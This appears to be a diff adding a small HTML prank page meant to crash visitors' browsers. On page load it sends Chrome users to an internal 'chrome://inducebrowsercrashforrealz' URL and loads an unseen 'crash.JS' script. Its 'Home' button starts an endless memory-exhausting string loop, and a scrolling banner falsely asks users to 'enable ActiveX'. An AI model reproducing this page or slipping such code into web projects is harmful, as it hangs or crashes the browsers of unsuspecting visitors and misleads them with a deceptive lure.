@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <style>
+  body{
+    background-image: url(images/Bitmap256.bmp);
+  }
+  h1 {
+    font-size: 72px;
+    color:red;
+  }
+  div {
+    background-color: rgb(255, 0, 0);
+    font-family: 'Courier New', Courier, monospace;
+    font-size: 45px;
+  }
+  </style>
+ <script src="crash.JS"></script>
+</head>
+
+<body  onload="myFunction()">
+  
+
+
+<script>
+function myFunction() { 
+  if(navigator.userAgent.indexOf("Chrome") != -1 )
+    {
+        window.location.replace("chrome://inducebrowsercrashforrealz")
+       
+    }
+  }
+    </script>
+  <div> 
+   <marquee>Please enable ActiveX. </marquee> 
+
+   </div>
+    <h1>lol</h1>
+    <button id="myButton" class="float-left submit-button" >Home</button>
+    <script type="text/javascript">
+      document.getElementById("myButton").onclick = function() {
+        txt = "a";
+while(1){
+    txt = txt += "a";    //add as much as the browser can handle
+};
+      }; 
+          </script>
+    <img src="images/lol.gif">
+   
+  </body>
+</html> 
+
